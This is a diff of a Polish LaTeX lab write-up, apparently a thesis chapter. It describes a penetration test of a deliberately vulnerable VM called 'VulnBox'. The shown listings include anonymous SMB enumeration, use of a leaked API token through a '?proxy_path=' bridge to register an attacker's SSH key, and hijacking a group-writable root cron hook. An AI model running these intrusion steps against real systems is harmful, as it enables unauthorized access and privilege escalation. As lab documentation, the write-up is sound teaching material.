@@ -21,7 +21,7 @@ PORT     STATE    SERVICE     VERSION
 8080/tcp open     http        nginx 1.28.3 (Ubuntu)
 \end{lstlisting}
 
-Jak wynika z listingu \ref{lst:e2e-nmap}, port \texttt{5000/tcp} jest blokowany z zewnątrz przez zaporę UFW (\texttt{filtered}), a dostępne pozostają wyłącznie usługi SSH, Samba oraz serwer HTTP Nginx. Następnie wylistowano dostępne udziały sieciowe usługi Samba bez podawania poświadczeń (flaga \texttt{-N}).
+Jak wynika z listingu \ref{lst:e2e-nmap}, port \texttt{5000/tcp} jest blokowany z zewnątrz przez zaporę UFW (\texttt{filtered}), a dostępne pozostają wyłącznie usługi SSH, Samba oraz serwer HTTP Nginx. Następnie wylistowano dostępne udziały sieciowe usługi Samba bez podawania poświadczeń.
 
 \begin{lstlisting}[language=bash, caption={Wylistowanie anonimowych udziałów SMB narzędziem smbclient}, label={lst:e2e-smb-list}]
 $ smbclient -N -L //192.168.56.101/
@@ -63,6 +63,8 @@ Notatka pobrana w listingu \ref{lst:e2e-smb-get} ujawnia parametry portalu diagn
 
 W drugim etapie sprawdzono najpierw punkt diagnostyczny \texttt{?module=status} portalu WWW, potwierdzając jego działanie oraz obsługiwane parametry wejściowe.
 
+\newpage
+
 \begin{lstlisting}[language=bash, caption={Weryfikacja statusu portalu WWW na porcie 8080/tcp}, label={lst:e2e-web-status}]
 $ curl -s "http://192.168.56.101:8080/?module=status"
 === VulnBox Diagnostics Portal ===
@@ -102,12 +104,13 @@ W wyniku zapytania z listingu \ref{lst:e2e-web-traversal} uzyskano statyczny tok
 
 Ponieważ serwis Flask nasłuchuje wyłącznie na interfejsie lokalnym (\texttt{127.0.0.1:5000}), komunikację z nim zrealizowano przez parametr mostka \texttt{?proxy\_path=}. Przekazując pozyskany w etapie 2 token, zweryfikowano metadane API oraz przesłano klucz publiczny SSH analityka.
 
+\newpage
+
 \begin{lstlisting}[language=bash, caption={Weryfikacja tokenu i rejestracja klucza SSH przez mostek ?proxy\_path=}, label={lst:e2e-api-sshkey}]
 $ curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9f8e7d6c5b4a3f2e1d0c"
 {"authorized_keys_path":"/home/dev/.ssh/authorized_keys","endpoints":["/health","/api/v1/info","/api/v1/ssh-key"],"managed_account":"dev","service":"vulnbox-internal-api"}
 
-$ curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" \
-       --data-urlencode "ssh_key=$(cat ~/.ssh/id_ed25519.pub)"
+$ curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" --data-urlencode "ssh_key=$(cat ~/.ssh/id_ed25519.pub)"
 {"account":"dev","authorized_keys_path":"/home/dev/.ssh/authorized_keys","status":"registered"}
 \end{lstlisting}
 
@@ -145,7 +148,7 @@ dev@vulnbox:~$ ls -la /opt/admin/hooks/pre_backup.sh
 -rwxrwxr-x 1 root dev 106 Nov 23 21:15 /opt/admin/hooks/pre_backup.sh
 \end{lstlisting}
 
-Z uwagi na uprawnienia \texttt{0775} dla grupy \texttt{dev} (listing \ref{lst:e2e-cron-inspect}), otwarto plik \path{/opt/admin/hooks/pre_backup.sh} w edytorze \texttt{nano} (\texttt{nano /opt/admin/hooks/pre\_backup.sh}) i zapisano w nim kod przedstawiony na listingu \ref{lst:e2e-cron-nano}, zachowując bit wykonywalności.
+Z uwagi na uprawnienia \texttt{0775} dla grupy \texttt{dev} (listing \ref{lst:e2e-cron-inspect}), otwarto plik \path{/opt/admin/hooks/pre_backup.sh} w edytorze \texttt{nano} (\texttt{nano /opt/admin/hooks/pre\_backup.sh}) i zapisano w nim kod przedstawiony na listingu \ref{lst:e2e-cron-nano}.
 
 \begin{lstlisting}[style=code, language=bash, caption={Zawartość skryptu /opt/admin/hooks/pre\_backup.sh zapisana w edytorze nano}, label={lst:e2e-cron-nano}]
 #!/usr/bin/env bash
@@ -156,7 +159,7 @@ chmod 0600 /tmp/cron_verify.out
 chown dev:dev /tmp/cron_verify.out
 \end{lstlisting}
 
-Po odczekaniu jednego cyklu harmonogramu (\texttt{sleep 65}) odczytano utworzony przez demona \texttt{cron} plik wynikowy.
+Po odczekaniu jednego cyklu harmonogramu (\texttt{sleep 65}) odczytano utworzony przez demona \texttt{cron} plik.
 
 \begin{lstlisting}[language=bash, caption={Odczyt wyniku wykonania zadania cron i flagi /root/root.txt}, label={lst:e2e-cron-exec}]
 dev@vulnbox:~$ sleep 65 && cat /tmp/cron_verify.out
